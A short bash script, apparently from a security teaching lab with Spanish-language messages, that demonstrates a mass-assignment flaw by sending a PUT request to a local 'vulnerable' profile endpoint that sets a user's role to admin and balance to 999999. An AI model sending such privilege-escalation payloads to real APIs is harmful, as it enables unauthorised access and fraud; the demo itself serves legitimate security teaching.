#!/bin/bash
echo "=== Mass Assignment Vulnerable: Escalada a admin ==="
echo "Roberto intenta hacerse admin y cambiar su saldo:"
echo ""
curl -s -X PUT -H "Content-Type: application/json" \
  -d '{"name":"Roberto Hacker","role":"admin","balance":999999}' \
  http://localhost:8080/api/mass-assignment/vulnerable/profile/2 | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS — role=admin, balance=999999"
